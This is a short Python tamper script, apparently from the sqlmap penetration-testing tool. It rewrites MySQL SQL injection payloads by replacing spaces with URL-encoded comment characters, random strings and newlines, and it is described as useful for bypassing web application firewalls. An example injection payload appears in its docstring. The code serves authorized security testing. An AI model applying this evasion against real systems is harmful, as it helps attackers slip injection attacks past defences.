#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import os
import random
import string

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__)[:-3], DBMS.MYSQL))

def tamper(payload):
    """
    Replaces space character (' ') with a pound character ('#') followed by
    a random string and a new line ('\n')

    Example:
        * Input: 1 AND 9227=9227
        * Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass several web application firewalls
    """

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.lowercase) for x in range(random.randint(6, 12)))
                retVal += "%%23%s%%0A" % randomStr
            else:
                retVal += payload[i]

    return retVal
